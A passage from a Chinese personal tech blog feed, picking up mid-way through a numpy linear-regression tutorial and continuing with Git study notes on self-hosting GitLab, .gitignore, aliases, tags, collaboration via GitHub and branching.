<p>然后初始化我们的参数<code>w,b</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    w, b = np.random.randn(), np.random.randn()</span><br><span class="line">    <span class="comment"># 参数合并</span></span><br><span class="line">    <span class="keyword">return</span> np.array([[w],</span><br><span class="line">                     [b]])</span><br></pre></td></tr></table></figure>

<p>定义误差函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">l</span><span class="params">(W, X, y)</span>:</span></span><br><span class="line">    WX = np.dot(X, W) - y</span><br><span class="line">    <span class="keyword">return</span> WX ** <span class="number">2</span> / <span class="number">2.0</span></span><br></pre></td></tr></table></figure>

<p>定义损失函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loss</span><span class="params">(W, X, y)</span>:</span></span><br><span class="line">    l_value = l(W, X, y)</span><br><span class="line">    n = X.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> np.sum(l_value) / n</span><br></pre></td></tr></table></figure>

<p>梯度下降法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gradient_descent</span><span class="params">(W, X, y)</span>:</span></span><br><span class="line">    n = y.shape[<span class="number">0</span>]</span><br><span class="line">    A = np.dot(X, W) - y</span><br><span class="line">    <span class="keyword">return</span> np.dot(X.T, A) / n</span><br></pre></td></tr></table></figure>

<p>开始我们的训练：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">()</span>:</span></span><br><span class="line">    learning_rate, epoch = <span class="number">0.01</span>, <span class="number">100</span></span><br><span class="line">    W = init()</span><br><span class="line">    x, y = data()</span><br><span class="line">    one = np.ones((x.shape[<span class="number">0</span>],<span class="number">1</span>))</span><br><span class="line">    X = np.c_[x, one]</span><br><span class="line">    loss_x, loss_y = np.zeros((epoch, <span class="number">1</span>)), np.zeros((epoch, <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(epoch):</span><br><span class="line">        loss_value = loss(W, X, y)</span><br><span class="line">        print(<span class="string">"epoch = "</span>, i, <span class="string">"loss = "</span>, loss_value)</span><br><span class="line">        loss_x[i] = i</span><br><span class="line">        loss_y[i] = loss_value</span><br><span class="line">        </span><br><span class="line">        grad = gradient_descent(W, X, y)</span><br><span class="line">        W = W - learning_rate * grad</span><br><span class="line">    plt.subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">    plt.scatter(x, y)</span><br><span class="line">    plt.plot(X[:, <span class="number">0</span>], np.dot(X, W), color=<span class="string">'red'</span>)</span><br><span class="line">    </span><br><span class="line">    plt.subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">    plt.title(<span class="string">"loss"</span>)</span><br><span class="line">    plt.plot(loss_x, loss_y)</span><br></pre></td></tr></table></figure>

<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220326103436.png" alt></p>
<p>可以发现，拟合效果还是挺不错的，损失值下降得也挺快，前面的急剧下降是因为我们是随机初始化的参数，该参数对应的导数可能比较大，因此更新得比较快。</p>
]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>线性回归</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习笔记之搭建私服</title>
    <url>/2022/02/12/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%8D/</url>
    <content><![CDATA[<p>书接上回，本文主要介绍如何搭建属于你自己的<code>Git</code>私服。</p>
<a id="more"></a>

<p>我们之前演示了如何使用第三方代码托管平台<code>Github</code>来作为我们远端仓库，不过虽然之前<code>Github</code>允许建立私有仓库，但是免费的之余还是有一些限制诸如协作者人数不能过多，况且有的时候我们视代码如命脉，不想开源又想使用<code>Git</code>怎么办？答案就是搭建私服！搭建私服有几种方式，下面介绍一种比较流行的，但是比较复杂。</p>
<p>前提提示：我的<code>Linux</code>系统是<code>centos7</code>。</p>
<h2 id="安装GitLab"><a href="#安装GitLab" class="headerlink" title="安装GitLab"></a>安装GitLab</h2><p>安装前提依赖：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install -y curl policycoreutils-python openssh-server perl</span><br></pre></td></tr></table></figure>

<p> 在系统防火墙中打开 <code>HTTP</code>、<code>HTTPS</code>和 <code>SSH</code>访问 （可选，不设置则只能从本地网络访问 ）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable sshd</span><br><span class="line">sudo systemctl start sshd</span><br><span class="line">sudo firewall-cmd --permanent --add-service=http</span><br><span class="line">sudo systemctl reload firewalld</span><br></pre></td></tr></table></figure>

<p> 安装 <code>Postfix</code> 以发送电子邮件通知 （可选）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install postfix</span><br><span class="line">sudo systemctl enable postfix</span><br><span class="line">sudo systemctl start postfix</span><br></pre></td></tr></table></figure>

<p>下载<code>GitLab</code>安装包</p>
<p>到网站<a href="https://packages.gitlab.com/gitlab/gitlab-ce/下载合适的包" target="_blank" rel="noopener">https://packages.gitlab.com/gitlab/gitlab-ce/下载合适的包</a></p>
<blockquote>
<p>gitlab-ce是社区版，免费的<br>gitlab-ee是企业版，收费的</p>
</blockquote>
<p>找到合适的包后页面往下滑找到<code>wget</code>的地址复制下来到服务器中下载：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget --content-disposition https://packages.gitlab.com/gitlab/gitlab-ce/packages/el/7/gitlab-ce-14.7.2-ce.0.el7.x86_64.rpm/download.rpm</span><br></pre></td></tr></table></figure>

<p>然后开始安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo rpm -Uvh gitlab-ce-14.7.2-ce.0.el7.x86_64.rpm</span><br></pre></td></tr></table></figure>

<p> 安装成功后的提示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Thank you for installing GitLab! GitLab was unable to detect a valid hostname for your instance. Please configure a URL for your GitLab instance by setting &#96;external_url&#96; configuration in &#x2F;etc&#x2F;gitlab&#x2F;gitlab.rb file. Then, you can start your GitLab instance by running the following command:  sudo gitlab-ctl reconfigure</span><br></pre></td></tr></table></figure>

<p>按照提示，打开<code>/etc/gitlab/gitlab.rb</code>文件，搜索<code>external_url</code>选项，设置为<code>ip</code>地址（例如我的为<a href="http://124.222.8.87:81/）或者域名地址" target="_blank" rel="noopener">http://124.222.8.87:81/）或者域名地址</a></p>
<p>然后重新配置：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gitlab-ctl reconfigure</span><br></pre></td></tr></table></figure>

<p>然后开启<code>gitlab</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gitlab-ctl start</span><br></pre></td></tr></table></figure>

<p>然后访问之前设置的<code>ip</code>地址</p>
<p><img src="https://qiniu.yalexin.top/gitlab-0.png" alt></p>
<p> 用户名为<code>root</code>。初始密码是在<code>/etc/gitlab/initial_root_password</code>，不过该密码在执行<code>reconfigreure</code>后的24小时就会被删除，所以记性不好的话建议立即改密码。</p>
<blockquote>
<p>如果无法访问，则可能是没有开放防火墙端口</p>
<p>依次执行以下命令即可：</p>
<p><code>firewall-cmd --zone=public --list-ports</code> #查看开放端口<br><code>firewall-cmd --zone=public --add-port=81/tcp --permanent</code> #开放81端口<br><code>firewall-cmd --reload</code>   #重新加载配置<br>#如果不需要，也可以直接关闭防火墙，前提是不怕被运维的追着打！<br><code>systemctl stop firewalld.service</code></p>
</blockquote>
<p><strong>强烈建议服务器运行内存在2GB以上！！</strong></p>
<p>我的学生机真的只有2BG内存，还得开个4GB的虚拟内存才勉勉强强运行起来。</p>
<h2 id="注册并使用GitLab"><a href="#注册并使用GitLab" class="headerlink" title="注册并使用GitLab"></a>注册并使用GitLab</h2><p>我发现2GB实在是不能用，只好斥巨资几块钱在华为云上买了弹性计算型主机~~</p>
<p>登录后台以后，可以自行选择更改语言为简体中文，也可以使用默认的。</p>
<p>接下来就像使用<code>GitHub</code>一样啦！</p>
<p>先注册普通用户，因为你总不可能所有人都使用<code>root</code>账户吧！</p>
<p><img src="https://qiniu.yalexin.top/gitlab-1.png" alt></p>
<p>注册好以后，管理员后台审核即可。</p>
<p><img src="https://qiniu.yalexin.top/gitlab-2.png" alt></p>
<p><img src="https://qiniu.yalexin.top/gitlab-4.png" alt></p>
<p>通过以后，该普通用户就可以登录了。</p>
<p>当然了，为了能够正常使用，还<strong>需要添加<code>SSH</code>公钥。</strong></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>学习</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习笔记之Git配置</title>
    <url>/2022/02/11/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BGit%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>书接上回，本文主要介绍<code>Git</code>的一些其他配置选项。</p>
<a id="more"></a>

<h2 id="忽略部分文件"><a href="#忽略部分文件" class="headerlink" title="忽略部分文件"></a>忽略部分文件</h2><p>经常使用一些框架都见项目的小伙伴应该都会发现，一些使用<code>git</code>的框架在生成项目的时候一搬都会生成一个<code>.gitignore</code>文件，该文件里边描述的是我们要求<code>Git</code>忽略的文件，每次提交和推送的时候<code>Git</code>就不会记录这些文件。</p>
<p>什么时候需要用这个呢？</p>
<ul>
<li><p>你的配置文件中有数据库密码，你不想泄露出去</p>
</li>
<li><p>依赖包过多，特别是部分前端框架！</p>
</li>
</ul>
<p><img src="https://qiniu.yalexin.top/difference.jpg" alt="1644563191198"></p>
<ul>
<li>部分操作系统自动生成的文件</li>
<li>等等</li>
</ul>
<h3 id="编写规范"><a href="#编写规范" class="headerlink" title="编写规范"></a>编写规范</h3><ul>
<li><p>所有空行或者以注释符号 <code>＃</code>开头的行都会被<code>Git</code> 忽略</p>
</li>
<li><p>可以使用标准的<code>glob</code>模式匹配</p>
</li>
<li><p>匹配模式最后跟斜杠(<code>/</code>)说明要忽略的是目录</p>
</li>
<li><p>要忽略指定模式以外的文件或目录，可以在模式前加上感叹号(<code>!</code>)进行取反</p>
</li>
</ul>
<blockquote>
<p>所谓的<code>glob</code>模式是指<code>shell</code>所使用的简化了的正则表达式，匹配规则如下：<br> <code>&quot;*&quot;</code>：星号匹配零个或多个任意字符<br> <code>[]</code>：匹配任何一个列在方括号中的字符，如[ab]匹配a或者匹配b<br> <code>&quot;?&quot;</code>：问号匹配一个任意字符<br> <code>[n-m]</code>：匹配所有在这两个字符范围内的字符，如[0-9]表示匹配所有0到9的数字</p>
</blockquote>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>附上<code>Java</code>开发通用模板</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">java</span></span><br><span class="line">*.class</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">package file</span></span><br><span class="line">*.war</span><br><span class="line">*.ear</span><br><span class="line">*.zip</span><br><span class="line">*.tar.gz</span><br><span class="line">*.rar</span><br><span class="line"><span class="meta">#</span><span class="bash">maven ignore</span></span><br><span class="line">target/</span><br><span class="line">build/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">eclipse ignore</span></span><br><span class="line">.settings/</span><br><span class="line">.project</span><br><span class="line">.classpatch</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">Intellij idea</span></span><br><span class="line">.idea/</span><br><span class="line">/idea/</span><br><span class="line">*.ipr</span><br><span class="line">*.iml</span><br><span class="line">*.iws</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> temp file</span></span><br><span class="line">*.log</span><br><span class="line">*.cache</span><br><span class="line">*.diff</span><br><span class="line">*.patch</span><br><span class="line">*.tmp</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> system ignore</span></span><br><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line"><span class="meta">#</span><span class="bash"> 不排除.gitignore</span></span><br><span class="line">!.gitignore</span><br></pre></td></tr></table></figure>

<p>我是小白啊！其他项目怎么办啊？不懂写该文件啊！</p>
<p>放心，<code>GitHub</code>已经帮我们写了很多模板了，我们拿过来抄答案就行了： <a href="https://github.com/github/gitignore" target="_blank" rel="noopener">https://github.com/github/gitignore</a>。</p>
<p><strong>记得新建项目后第一时间写好该文件并提交！</strong> 如果某些文件已经被纳入了版本管理中，则修改<code>.gitignore</code>是无效的。 </p>
<p>如果我们想添加的文件被写进了规则中，可以使用<code>!</code>将其排除，也可以在<code>add</code>的时候加入<code>-f</code>强制添加。</p>
<h3 id="全局-gitignore文件"><a href="#全局-gitignore文件" class="headerlink" title="全局.gitignore文件"></a>全局.gitignore文件</h3><p>上述所说的是项目级别的，我们也可以指定一个全局级别的，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global core.excludesfile  filename</span></span><br></pre></td></tr></table></figure>

<p><code>filename</code>包含路径名。</p>
<h2 id="使用命令别名"><a href="#使用命令别名" class="headerlink" title="使用命令别名"></a>使用命令别名</h2><p>熟悉<code>Linux</code>命令的同学应该都知道<code>Linux</code>支持将命令别名化，<code>Git</code>也支持该功能，为我们提升效率。</p>
<p>使用方法为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global alias.newName oldName</span></span><br></pre></td></tr></table></figure>

<p>例如</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global alias.swc switch</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global alias.cmt commit</span></span><br></pre></td></tr></table></figure>

<p>稍微复杂的也可以定制</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global alias.log1 <span class="string">"log --graph --pretty=oneline --abbrev-commit"</span></span></span><br></pre></td></tr></table></figure>

<p>听说有人丧心病狂地把<code>lg</code>配置成了： </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global alias.lg "log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset' --abbrev-commit"</span><br></pre></td></tr></table></figure>

<p><img src="https://qiniu.yalexin.top/log.png" alt="1644566150616"></p>
<p>果然<strong>人类的懒惰推动了社会科技的进步</strong> 。可我还想多学点外语，真的！！</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>学习</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习笔记之标签管理</title>
    <url>/2022/02/10/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%A0%87%E7%AD%BE%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<p>书接上回，本文主要介绍<code>Git</code>的标签管理。</p>
<a id="more"></a>

<p> 标签用于标记某一提交点，唯一绑定一个固定的<code>commitId</code>，相当于为这次提交记录指定一个别名，方便提取文件，否则会出现：</p>
<p>“阿信，快将前些天的版本打包发布，提交<code>ID</code>为马冬梅”</p>
<p>“好的，马什么梅”</p>
<p>“马冬梅”</p>
<p>“什么冬梅？”</p>
<p>“明天别来上班了！”</p>
<p>“…………”</p>
<hr>
<p>标签实际上就是指向某个<code>commit</code>的指针，只不过该指针不会移动。</p>
<h2 id="创建标签"><a href="#创建标签" class="headerlink" title="创建标签"></a>创建标签</h2><p>要打标签之前，首先切换到需要打标签的分支上： </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch</span></span><br><span class="line">* dev</span><br><span class="line">  master</span><br><span class="line"><span class="meta">$</span><span class="bash"> git switch master</span></span><br><span class="line">Switched to branch 'master'</span><br></pre></td></tr></table></figure>

<p> 输入命令<code>git tag tag-name</code>就可以打一个新标签： </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git tag v1.0</span><br></pre></td></tr></table></figure>

<p>可以用命令<code>git tag</code>查看所有标签：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git tag</span><br><span class="line">v1.0</span><br></pre></td></tr></table></figure>

<p>默认标签是打在最新提交的<code>commit</code>上的。当然也可以打在历史提交上，创建标签时加上对应的<code>commitId</code>即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git tag v0.9 commitId</span></span><br></pre></td></tr></table></figure>

<p>用<code>show</code>命令可以查看标签的详细信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git show v1.0</span></span><br><span class="line">commit 274515d79ec8898dd098102681864fd862d68978 (HEAD -&gt; master, tag: v1.0, dev)</span><br><span class="line">Merge: e167bc0 f7f1ef6</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Wed Feb 9 16:54:01 2022 +0800</span><br><span class="line"></span><br><span class="line">    merge by no-ff</span><br></pre></td></tr></table></figure>

<h2 id="操作标签"><a href="#操作标签" class="headerlink" title="操作标签"></a>操作标签</h2><p>推送某个标签到远程，使用命令<code>git push origin tag-name</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git  push origin v1.0</span></span><br></pre></td></tr></table></figure>

<p>当然了，如果想要一次性推送多个标签也可以：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git push origin --tags</span></span><br></pre></td></tr></table></figure>

<p>如果要删除标签，假如<code>-d</code>参数即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git tag -d v1.0</span></span><br></pre></td></tr></table></figure>

<p> 不过上述命令是删除本地的标签，如果要删除远端的标签，要先删除本地则格式为<code>git push &lt;remote_name&gt; :refs/tags/&lt;tag_name&gt;</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git push origin :refs/tags/v1.0</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>学习</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习笔记之多人协作</title>
    <url>/2022/02/10/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A4%9A%E4%BA%BA%E5%8D%8F%E4%BD%9C/</url>
    <content><![CDATA[<p>书接上回，本文介绍利用<code>Git</code>进行多人协作。</p>
<a id="more"></a>

<p>我们都知道，<code>Git</code>是一个分布式版本控制管理软件，何为分布式？简单来说代码仓库在多台主机上都有备份，任意一台挂了也不至于代码丢失（当然所有关联了该仓库的主机都挂了的时候另当别论）。</p>
<p>我们所说的多人协作就是每个人在自己的电脑上都有中央仓库代码的一份备份代码，适当之时将我们的代码推送至中央仓库或者拉取别人写的代码下来，这时候就需要一台电脑充当服务器，在上面运行我们的<code>Git</code>程序，但是我们就像简简单单使用一下<code>Git</code>，并不想搭建服务器，可以吗？</p>
<p>答案是肯定的，有不少企业都推出了第三方代码托管平台，最出名的怕不是<a href="https://github.com/" target="_blank" rel="noopener"><code>Github</code></a>了，不过有一些特殊原因，该网站可能不稳定，建议配合国内的托管平台使用，国内比较知名的有<a href="https://gitee.com/" target="_blank" rel="noopener"><code>Gitee</code></a>、<a href="https://coding.net/" target="_blank" rel="noopener"><code>CODING</code></a>，另外，<code>github</code>默认所有仓库都是公开的，要想建立私有的仓库还是要充值，不过要是有教育邮箱可以优惠，该网站的用户也比较多，上面的项目质量也更好。</p>
<h2 id="远程仓库的使用"><a href="#远程仓库的使用" class="headerlink" title="远程仓库的使用"></a>远程仓库的使用</h2><p>为了方便演示多人协作，以使用<code>github</code>为例，本人使用的笔记本和服务器作为两个用户连接到<code>github</code>上面的仓库。</p>
<h3 id="创建GitHub账户并新建一个空仓库"><a href="#创建GitHub账户并新建一个空仓库" class="headerlink" title="创建GitHub账户并新建一个空仓库"></a>创建GitHub账户并新建一个空仓库</h3><p>注册账号就不用多说了吧。</p>
<p>然后点击右上角的加号，点击”new repository”，输入名字“cooperation”，然后点击“Create repository”。</p>
<h3 id="关联SSH-Key-到GitHub"><a href="#关联SSH-Key-到GitHub" class="headerlink" title="关联SSH Key 到GitHub"></a>关联SSH Key 到GitHub</h3><p>在Windows系统上面，首先创建<code>SSH Key</code>，打开命令提示符窗口或者<code>Git bash</code></p>
<p>输入以下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C "495592364@qq.com"</span><br></pre></td></tr></table></figure>

<p>然后按下三次回车即可生成。</p>
<p><img src="https://qiniu.yalexin.top/cooperation1.jpg" alt></p>
<p>记得把邮箱换成你的，然后打开<code>C:\Users\YaleXin\.ssh</code>，即你的用户名下的<code>.ssh</code>文件夹， 里边有<code>id_rsa</code>和<code>id_rsa.pub</code>这两个文件 ， 这两个就是<code>SSH Key</code>的秘钥对，<code>id_rsa</code>是私钥，千万不能泄露出去，<code>id_rsa.pub</code>是公钥，可以放心地告诉任何人。</p>
<p>然后打开<code>id_rsa.pub</code>，将里边的内容复制，接着打开<code>GitHub</code>网站，依次点击你的头像，“setting”，“SSH and GPG keys”，然后将刚刚复制的内容“ Key ”中，起一个好一点的“title”。</p>
<p>这样子<code>Windows</code>系统以后就可以关联<code>GitHub</code>了。</p>
<p>同样的方法在服务器上面再次操作</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C "me@yalexin.top"</span><br></pre></td></tr></table></figure>

<p>然后注意公钥生成的位置即可。</p>
<p>然后将公钥内容加到<code>GitHub</code>。</p>
<h3 id="本地仓库关联GitHub仓库"><a href="#本地仓库关联GitHub仓库" class="headerlink" title="本地仓库关联GitHub仓库"></a>本地仓库关联GitHub仓库</h3><p>Windows系统上面，打开命令提示符窗口或者<code>Git bash</code>，初始化本地仓库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir cooperation</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> cooperation</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git init</span></span><br><span class="line">Initialized empty Git repository in E:/MyBlog/cooperation/.git/</span><br></pre></td></tr></table></figure>

<p>然后开始干活啦，主分支添加<code>readme</code>文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> touch README.md</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git add .</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"创建仓库"</span></span></span><br><span class="line">[master (root-commit) 3469c3f] 创建仓库</span><br><span class="line"> 1 file changed, 0 insertions(+), 0 deletions(-)</span><br><span class="line"> create mode 100644 README.md</span><br></pre></td></tr></table></figure>

<p>关联远程仓库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote add origin https://github.com/YaleXin/cooperation.git</span><br></pre></td></tr></table></figure>

<p><code>https://github.com/YaleXin/cooperation.git</code>这个地址在<code>GitHub</code>仓库界面获得。</p>
<p>添加后，远程仓库的名字就是<code>origin</code>，当然了，这是<code>Git</code>默认的叫法，你要是喜欢也可以改成别的，但是最好见名思意，<code>origin</code>这个名字一看就知道是远程库。</p>
<p>下一步，就可以把本地库的所有内容推送到远程库上：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git push -u origin master</span></span><br></pre></td></tr></table></figure>

<p>由于这是我们第一次向远端仓库推送，即远端仓库还没有该分支，因此需要加上<code>-u</code>参数，下次需要推送该分支的时候直接<code>git push</code>即可。</p>
<p>创建本人的分支</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch -c dev</span></span><br><span class="line">Switched to a new branch 'dev'</span><br><span class="line"><span class="meta">$</span><span class="bash"> git switch -c Axin</span></span><br><span class="line">Switched to a new branch 'Axin'</span><br><span class="line"><span class="meta">$</span><span class="bash"> touch xin.data</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git add .</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"添加用户信息"</span></span></span><br><span class="line">[Axin 64f3345] 添加用户信息</span><br><span class="line"> 1 file changed, 0 insertions(+), 0 deletions(-)</span><br><span class="line"> create mode 100644 xin.data</span><br></pre></td></tr></table></figure>

<p>合并到<code>dev</code>分支</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch dev</span></span><br><span class="line">Switched to branch 'dev'</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge Axin --no-ff -m <span class="string">"阿信完成用户信息"</span></span></span><br><span class="line">Merge made by the 'ort' strategy.</span><br><span class="line"> xin.data | 0</span><br><span class="line"> 1 file changed, 0 insertions(+), 0 deletions(-)</span><br><span class="line"> create mode 100644 xin.data</span><br></pre></td></tr></table></figure>

<p>将<code>dev</code>分支推送到远端</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch dev</span></span><br><span class="line">Switched to branch 'dev'</span><br><span class="line"><span class="meta">$</span><span class="bash"> git push -u origin dev</span></span><br></pre></td></tr></table></figure>

<p>实际情况中，<code>master</code>分支是主分支，因此要时刻与远程同步，<code>dev</code>分支是开发分支，团队所有成员都需要在上面工作，所以也需要与远程同步，<code>bug</code>分支只用于在本地修复<code>bug</code>，就没必要推到远程了，除非老板要看看你每周到底修复了几个<code>bug</code>，或者说你修复<code>bug</code>也作为效绩的一部分，哈哈哈哈哈哈；<code>feature</code>分支是否推到远程，取决于你是否和你的小伙伴合作在上面开发。</p>
<p>然后在<code>Linux</code>上面的用户只需要克隆该仓库既可以看到这边的提交了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/YaleXin/cooperation.git</span></span><br></pre></td></tr></table></figure>

<p>不过默认情况下只会拉取远端仓库的<code>master</code>分支</p>
<p>如果需要拉取<code>dev</code>分支，则需要</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch dev origin/dev</span></span><br></pre></td></tr></table></figure>

<p>即新建一个<code>dev</code>分支关联至远端仓库的<code>dev</code>分支。</p>
<p>当然了，最好在这边新建自己的分支，并且<strong>定期使用</strong><code>git pull</code>更新<code>dev</code>和<code>master</code>分支。</p>
<p> 如果<code>git pull</code>提示<code>no tracking information</code>，则说明本地分支和远程分支的链接关系没有创建，用命令<code>git branch --set-upstream-to branch-name  origin/branch-name</code>即可。 </p>
<p><strong>不过由于<code>GitHub</code>可能访问不正常，国内建议使用<code>gitee</code></strong></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>学习</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习笔记之分支管理</title>
    <url>/2022/02/09/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<p>书接上回，本文主要介绍<code>Git</code>的分支管理操作。</p>
<p><code>Git</code>的分支功能为我们团队分工提供了方便，并且每一个分支在合并之前不会对另外的分支产生影响：</p>
<a id="more"></a>

<p><img src="https://qiniu.yalexin.top/branch.drawio.png" alt></p>
<p>与分支管理相关的命令：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>git branch (branchname)</td>
<td>创建分支</td>
<td>git checkout/switch (branchname)</td>
<td>切换分支</td>
</tr>
<tr>
<td>git merge (branchname)</td>
<td>合并指定分支</td>
<td>git branch</td>
<td>列出所有分支</td>
</tr>
<tr>
<td>git branch -d (branchname)</td>
<td>删除指定分支</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><code>Git</code>默认给我们生成了一个<code>master</code>主分支</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch</span></span><br><span class="line">* master</span><br></pre></td></tr></table></figure>

<p>我们之前说的<code>HEAD</code>指向当前版本，严格来说是指向<code>master</code>，而<code>master</code>指向的是该分支的最新提交，因此<code>HEAD</code>指向的是最新提交，熟悉类<code>C</code>语言的指针相关知识应该很容易理解这部分内容。</p>
<p><img src="https://qiniu.yalexin.top/branch.drawio2.png" alt></p>
<h2 id="使用分支"><a href="#使用分支" class="headerlink" title="使用分支"></a>使用分支</h2><h3 id="新建分支"><a href="#新建分支" class="headerlink" title="新建分支"></a>新建分支</h3><p>新建一个前端分支<code>front</code></p>
